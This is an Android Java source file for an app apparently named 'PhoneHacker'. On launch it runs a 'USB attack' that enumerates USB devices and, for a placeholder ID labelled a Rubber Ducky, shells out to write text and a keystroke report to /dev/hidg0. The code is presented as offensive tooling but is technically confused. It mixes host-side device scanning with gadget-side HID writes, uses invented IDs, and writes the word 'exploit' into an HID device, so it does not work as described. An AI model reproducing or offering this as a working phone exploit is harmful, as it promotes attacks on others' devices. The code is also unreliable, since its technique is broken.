package com.offensive.phonehacker;

import android.app.Activity;
import android.content.Context;
import android.hardware.usb.UsbDevice;
import android.hardware.usb.UsbManager;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import java.io.IOException;
import java.util.HashMap;

public class MainActivity extends Activity {
    private static final String TAG = "PhoneHacker";
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        statusText = findViewById(R.id.status_text);

        // Execute USB attack on launch
        executeUsbAttack();
    }

    private void executeUsbAttack() {
        UsbManager usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);
        HashMap<String, UsbDevice> deviceList = usbManager.getDeviceList();

        if (deviceList.isEmpty()) {
            logStatus("No USB devices detected");
            return;
        }

        logStatus("USB devices detected: " + deviceList.size());

        for (UsbDevice device : deviceList.values()) {
            logStatus("USB Device: " + device.getDeviceName());
            logStatus("Vendor ID: " + device.getVendorId() + ", Product ID: " + device.getProductId());

            // Attempt to exploit USB OTG (e.g., HID keyboard emulation)
            if (device.getVendorId() == 0x1234 && device.getProductId() == 0x5678) {  // Example: Rubber Ducky
                logStatus("Exploiting USB HID device...");
                exploitUsbHid(device);
            }
        }
    }

    private void exploitUsbHid(UsbDevice device) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Simulate keystrokes via USB HID (real-world: use UsbDeviceConnection)
                    String[] command = {
                        "/system/bin/sh", "-c", 
                        "echo 'exploit' > /dev/hidg0 && " +
                        "echo -ne '\x00\x00\x04\x00\x00\x00\x00\x00' > /dev/hidg0"  // Example: 'A' key press
                    };
                    Runtime.getRuntime().exec(command);
                    logStatus("USB HID exploit executed");
                } catch (IOException e) {
                    Log.e(TAG, "USB HID exploit failed: " + e.getMessage());
                    logStatus("USB HID exploit failed: " + e.getMessage());
                }
            }
        }).start();
    }

    private void logStatus(String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.append(message + "\n");
                Log.d(TAG, message);
            }
        });
    }
}
